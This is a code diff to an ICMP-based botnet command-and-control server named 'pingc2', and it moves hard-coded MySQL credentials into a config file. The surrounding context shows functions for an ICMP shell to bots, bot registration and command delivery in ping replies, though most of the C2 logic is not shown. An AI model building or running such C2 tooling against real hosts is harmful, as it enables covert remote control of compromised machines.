@@ -21,6 +21,7 @@ import ctypes
 import sys
 import signal
 import os
+from ConfigParser import SafeConfigParser
 from scapy.all import *
 
 # ICMP shell for single bot
@@ -125,8 +126,8 @@ def icmpshell(botNum,botIP,botConnect):
 def getBotIP(botId):
 	print "[*] Getting bot(%s) IP address" % botId
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
+                     user=dbusername.value, # your username
+                     passwd=dbpassword.value, # your password
                      db="pingc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
@@ -180,8 +181,8 @@ def sendPingResponse(dstIP,packetId,icmpId,command):
 def displayBots():
 	print "[*] Displaying bots!"
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
+                     user=dbusername.value, # your username
+                     passwd=dbpassword.value, # your password
                      db="pingc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
@@ -196,8 +197,8 @@ def displayBots():
 def updateBotSysinfo(botId,remoteIP,name,os):
 	print "[*] Updating bot info"
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
+                     user=dbusername.value, # your username
+                     passwd=dbpassword.value, # your password
                      db="pingc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
@@ -215,8 +216,8 @@ def updateBotSysinfo(botId,remoteIP,name,os):
 def doesBotExist(botId):
 	#print "[*] Checking bot existence"
         db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
+                     user=dbusername.value, # your username
+                     passwd=dbpassword.value, # your password
                      db="pingc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
@@ -238,8 +239,8 @@ def addBot(srcIP,name,os):
 	botId=0
 	try:
 		db = MySQLdb.connect(host="localhost", # your host, usually localhost
-                     user="pingc2user", # your username
-                     passwd="pingc2user", # your password
+                     user=dbusername.value, # your username
+                     passwd=dbpassword.value, # your password
                      db="pingc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
@@ -377,7 +378,23 @@ def main():
 	print "	 		Command Center              "
 	print "	 		   by NoCow		    "
 	print "	--------------------------------------------"
+	global dbusername
+	global dbpassword
+	conf_file = 'conf/pingc2.conf'
+        #print "[D] Getting bot Id"
+        cp = SafeConfigParser()
+        cp.optionxform = str # Preserves case sensitivity
+        cp.readfp(open(conf_file, 'r'))
+        section = 'Main'
+        dbpass = cp.get(section,'dbpass')
+	#print "[D] dbpass=%s" % dbpass
+	dbuser = cp.get(section,'dbuser')
+	#print "[D] dbuser=%s" % dbuser
 	manager = Manager()
+	dbusername = manager.Namespace()
+	dbusername.value = dbuser
+	dbpassword = manager.Namespace()
+	dbpassword.value = dbpass 
 	command = manager.Namespace()
 	command.value = 'sysinfo'
 	botShell = manager.Namespace()
